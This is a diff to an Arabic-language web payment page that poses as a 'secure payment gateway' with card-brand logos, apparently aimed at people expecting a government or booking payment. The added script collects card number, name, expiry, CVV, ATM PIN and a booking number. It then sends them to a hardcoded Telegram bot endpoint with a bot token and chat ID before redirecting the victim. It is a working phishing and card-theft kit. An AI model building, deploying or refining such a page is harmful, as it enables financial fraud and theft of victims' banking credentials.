@@ -3,48 +3,218 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>صفحة الدفع</title>
+  <title>بوابة الدفع الآمنة</title>
   <style>
-    body {font-family: Arial, sans-serif;direction: rtl;background-color: #f5f5f5;margin: 0;padding: 0;}
-    header, footer {background-color: #004080;color: white;text-align: center;padding: 20px 0;}
-    main {padding: 20px;}
-    form {background-color: white;padding: 20px;border-radius: 8px;max-width: 500px;margin: auto;box-shadow: 0 0 10px rgba(0,0,0,0.1);}
-    label {display: block;margin-top: 10px;}
-    input, select {width: 100%;padding: 8px;margin-top: 5px;box-sizing: border-box;}
-    button {margin-top: 20px;padding: 10px;width: 100%;background-color: #004080;color: white;border: none;border-radius: 4px;font-size: 16px;}
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    header, footer {
+      background-color: #004080;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+    }
+    main { padding: 20px; }
+    form {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label { display: block; margin-top: 10px; }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 10px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    .card-logos { display: flex; justify-content: center; gap: 20px; }
+    .card-logos img { height: 50px; }
   </style>
 </head>
 <body>
 
   <header>
-    <h2>صفحة الدفع</h2>
+    <div class="card-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
+    </div>
   </header>
 
   <main>
     <form id="paymentForm">
+
+      <label for="confirmBooking">تأكيد رقم الحجز:</label>
+      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+      <p id="lengthError" class="error-message">❗ رقم الحجز.</p>
+
       <label for="cardNumber">رقم البطاقة:</label>
-      <input type="text" id="cardNumber" required>
+      <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
 
-      <label for="cardName">الاسم على البطاقة:</label>
-      <input type="text" id="cardName" required>
+      <label for="cardName">الاسم الموجود على البطاقة:</label>
+      <input type="text" id="cardName" required />
 
-      <label for="expiry">تاريخ الانتهاء:</label>
-      <input type="month" id="expiry" required>
+      <label for="expiryMonth">الشهر (MM):</label>
+      <select id="expiryMonth" required>
+        <option value="">--</option>
+        <option>01</option><option>02</option><option>03</option>
+        <option>04</option><option>05</option><option>06</option>
+        <option>07</option><option>08</option><option>09</option>
+        <option>10</option><option>11</option><option>12</option>
+      </select>
 
-      <label for="cvv">CVV:</label>
-      <input type="number" id="cvv" required>
+      <label for="expiryYear">السنة (YYYY):</label>
+      <select id="expiryYear" required>
+        <option value="">--</option>
+        <option>2025</option><option>2026</option><option>2027</option>
+        <option>2028</option><option>2029</option><option>2030</option>
+        <option>2031</option><option>2032</option><option>2033</option>
+        <option>2034</option><option>2035</option><option>2036</option>
+        <option>2037</option><option>2038</option><option>2039</option>
+        <option>2040</option>
+      </select>
+
+      <label for="cvv">CVV (3 أو 4 أرقام):</label>
+      <input type="text" id="cvv" minlength="3" maxlength="4" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+      <!-- ✅ تمت إضافة هذا الحقل الجديد فقط -->
+      <label for="pin">الرقم السري لبطاقة الصراف (PIN)</label>
+      <input type="password" id="pin" inputmode="numeric" maxlength="4" pattern="\d{4}" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+      <!-- نهاية الإضافة -->
+
+      <p id="dateError" class="error-message">
+        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.
+      </p>
 
       <button type="submit">ادفع الآن</button>
     </form>
   </main>
 
-  <footer>© حكومة الإمارات 2025</footer>
+  <footer>جميع الحقوق محفوظة © 2025</footer>
 
   <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e){
+    // تنسيق رقم البطاقة 1234-5678-....
+    function formatCardNumber(input) {
+      let value = input.value.replace(/[^0-9]/g, "");
+      value = value.slice(0, 16);
+      let formatted = value.match(/.{1,4}/g);
+      input.value = formatted ? formatted.join("-") : "";
+    }
+
+    function digitsOnly(v){ return (v || '').replace(/[^0-9]/g, ''); }
+
+    function luhnCheck(numStr){
+      let sum = 0, shouldDouble = false;
+      for (let i = numStr.length - 1; i >= 0; i--) {
+        let d = parseInt(numStr.charAt(i), 10);
+        if (shouldDouble) {
+          d *= 2;
+          if (d > 9) d -= 9;
+        }
+        sum += d;
+        shouldDouble = !shouldDouble;
+      }
+      return (sum % 10) === 0;
+    }
+
+    function isValidCardNumber(displayValue){
+      const d = digitsOnly(displayValue);
+      if (d.length !== 16) return false;
+      return luhnCheck(d);
+    }
+
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', ()=>{
+      if (!isValidCardNumber(cardInput.value)) {
+        cardInput.style.borderColor = '#c00';
+      } else {
+        cardInput.style.borderColor = '';
+      }
+    });
+
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      window.location.href = 'verify.html';
+
+      const confirmBooking = document.getElementById("confirmBooking").value;
+      const lengthError = document.getElementById("lengthError");
+      const dateError = document.getElementById("dateError");
+
+      lengthError.style.display = "none";
+      dateError.style.display = "none";
+
+      if (confirmBooking.length !== 6) {
+        lengthError.style.display = "block";
+        return;
+      }
+
+      const month = parseInt(document.getElementById("expiryMonth").value);
+      const year = parseInt(document.getElementById("expiryYear").value);
+
+      if (year < 2025 || (year === 2025 && month < 7)) {
+        dateError.style.display = "block";
+        return;
+      }
+
+      if (!isValidCardNumber(cardInput.value)) {
+        cardInput.style.borderColor = '#c00';
+        cardInput.focus();
+        return;
+      }
+
+      const cardNumber = cardInput.value;
+      const cardName = document.getElementById("cardName").value;
+      const cvv = document.getElementById("cvv").value;
+      const pin = document.getElementById("pin").value;
+
+      // ✅ تحقق من إدخال PIN مكون من 4 أرقام
+      if (!/^\d{4}$/.test(pin)) {
+        alert("الرجاء إدخال الرقم السري المكون من 4 أرقام فقط");
+        return;
+      }
+
+      const message = `
+💳 معلومات عملية الدفع:
+------------------------
+📄 رقم البطاقة: ${cardNumber}
+👤 الاسم على البطاقة: ${cardName}
+📆 تاريخ الانتهاء: ${month}/${year}
+🔐 CVV: ${cvv}
+🔢 PIN: ${pin}
+🔢 رقم الحجز: ${confirmBooking}
+`;
+
+      fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: "8404960059", text: message })
+      })
+      .then(() => { window.location.href = "verify.html"; })
+      .catch(() => { alert("❌ فشل الإرسال إلى البوت"); });
     });
   </script>
+
 </body>
 </html>
